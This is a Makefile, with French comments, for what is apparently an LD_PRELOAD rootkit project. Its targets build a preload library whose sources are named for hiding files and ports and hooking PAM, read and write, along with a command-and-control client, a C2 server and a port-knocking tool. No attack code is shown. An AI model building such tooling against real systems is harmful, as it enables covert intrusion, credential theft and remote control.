CC = gcc
CFLAGS = -Wall -fPIC -shared -ldl
LDFLAGS = -lssl -lcrypto  # Pour lier OpenSSL si nécessaire

# --- Hooks : hook.so ---
SRCS = src/hook_write.c src/c2_client.c src/utils.c \
       src/hook_hide_files.c src/hook_hide_ports.c \
       src/hook_pam.c src/hook_read.c
OBJS = $(SRCS:.c=.o)
TARGET = hook.so

# --- Serveur C2 ---
C2_SRCS = src/c2_server.c
C2_OBJS = $(C2_SRCS:.c=.o)
C2_TARGET = c2_server

# --- Port Knocking ---
PORT_KNOCK_SRCS = src/port_knocking.c
PORT_KNOCK_OBJS = $(PORT_KNOCK_SRCS:.c=.o)
PORT_KNOCK_TARGET = port_knocking

# --- Règles principales ---
all: $(TARGET) $(C2_TARGET) $(PORT_KNOCK_TARGET)

# Construction de hook.so (LD_PRELOAD)
$(TARGET): $(OBJS)
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)

# Construction du serveur C2
$(C2_TARGET): $(C2_OBJS)
	$(CC) -o $(C2_TARGET) $(C2_OBJS) -lpthread

# Construction du port-knocking
$(PORT_KNOCK_TARGET): $(PORT_KNOCK_OBJS)
	$(CC) -o $(PORT_KNOCK_TARGET) $(PORT_KNOCK_OBJS) -lpthread

# Règle générique pour compiler en .o
%.o: %.c
	$(CC) -c -I./include $(CFLAGS) -o $@ $<

# --- Nettoyage ---
clean:
	rm -f $(OBJS) $(TARGET) \
	      $(C2_OBJS) $(PORT_KNOCK_OBJS) \
	      $(C2_TARGET) $(PORT_KNOCK_TARGET)
